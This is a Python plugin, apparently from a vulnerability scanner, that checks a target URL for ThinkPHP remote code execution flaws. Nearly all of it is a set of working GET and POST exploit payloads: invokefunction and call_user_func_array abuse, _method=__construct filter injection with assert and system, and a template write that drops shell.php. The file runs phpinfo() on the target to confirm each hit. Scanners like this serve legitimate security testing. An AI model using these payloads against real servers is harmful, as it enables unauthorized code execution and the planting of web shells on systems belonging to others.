import os
import requests

from lib.utils.path_info import get_path_info
from lib.utils.package import make_request_package 

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept-Language': '*',
    'Accept-Encoding': '*',
    'Keep-Alive': '300',
    'Cache-Control': 'max-age=0',
    'Connection': 'Keep-Alive'
    }

def check(url):
    results = []
    items = {
        "Url": url, 
        "Script": get_path_info(os.path.dirname(__file__)),
        "Vuln": 'thinkphp_rce', 
        "Type": None, 
        "Request": None
    }

    get_payloads = [
        r"?s=index/think\view/driver/Php/display&content=<?php phpinfo();?>",
        r"?s=index/think\template/driver/file/write&cacheFile=shell.php&content=<?php phpinfo();?>",
        r"?s=index/think\view/driver/Think/display&template=<?php phpinfo();?>",
        r"?s=Index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
        r"?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
        r"?s=index/think\request/input?data[]=phpinfo()&filter=assert",
        r"?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
        r"?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
        r"?s=index/think\Request/input&filter[]=phpinfo&data=-1",
        r"?s=index/think\module/action/param1/${@phpinfo()}"
    ]

    suffixs1 = [
        r"?s=index",
        r"?s=index/index",
        r"/"
    ]
    post_payloads1 = [
        r"_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo",
        r"_method=__construct&method=POST&filter[]=call_user_func&s=phpinfo",
        r"_method=__construct&method=GET&filter[]=call_user_func&aaaa=phpinfo",
        r"_method=__construct&method=POST&filter[]=assert&s=phpinfo()",
        r"c=assert&f=phpinfo&_method=filter",
        r"_method=__construct&filter[]=assert&server[REQUEST_METHOD]=phpinfo()",
        r"_method=__construct&filter[]=assert&method=GET&s=phpinfo()",
        r"_method=__construct&filter[]=phpinfo&method=get&s=-1",
        r"_method=__construct&method=get&filter[]=phpinfo&get[]=-1",
        r"_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=-1"
    ]

    suffixs2 = [
        r"?s=captcha&test=-1",
        r"?s=captcha"
    ]
    post_payloads2 = [
        r"_method=__construct&filter=phpinfo&method=get&server[REQUEST_METHOD]=1",
        r"_method=__construct&filter[]=phpinfo&method=GET&get[]=1",
        r"_method=__construct&filter[]=assert&server[REQUEST_METHOD]=phpinfo&method=get",
        r"_method=__construct&filter[]=call_user_func&server[REQUEST_METHOD]=phpinfo&method=get"
    ]

    try:
        s = requests.session()
        s.keep_alive = False
        for payload in get_payloads:
            r = s.get(url + payload, headers=headers)
            if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                items['Type'] = 'GET'
                items['Request'] = make_request_package(r.request)
                results.append(items.copy())

        for suffix in suffixs1:
            for payload in post_payloads1:
                r = s.post(url + suffix, data=payload, headers=headers)
                if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                    items['Type'] = 'POST' 
                    items['Request'] = make_request_package(r.request)
                    results.append(items.copy())
                
        for suffix in suffixs2:
            for payload in post_payloads2:
                r = s.post(url + suffix, data=payload, headers=headers)
                if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                    items['Type'] = 'POST' 
                    items['Request'] = make_request_package(r.request)
                    # print(url + ' ' + payload)
                    results.append(items.copy())
    
        suffix = r'?s=captcha&test=phpinfo()'
        payload = r'_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1'
        r = s.post(url + suffix, data=payload, headers=headers)
        if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
            items['Type'] = 'POST' 
            items['Request'] = make_request_package(r.request)
            results.append(items.copy())

        suffix = r'?s=captcha/phpinfo'
        payload = r'_method=__construct&filter[]=system&method=GET'
        r = s.post(url + suffix, data=payload, headers=headers)
        if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
            items['Type'] = 'POST' 
            items['Request'] = make_request_package(r.request)
            results.append(items.copy())


        if len(results) == 0:
            return False
        return results
    except Exception as e:
        print(e)
        return False
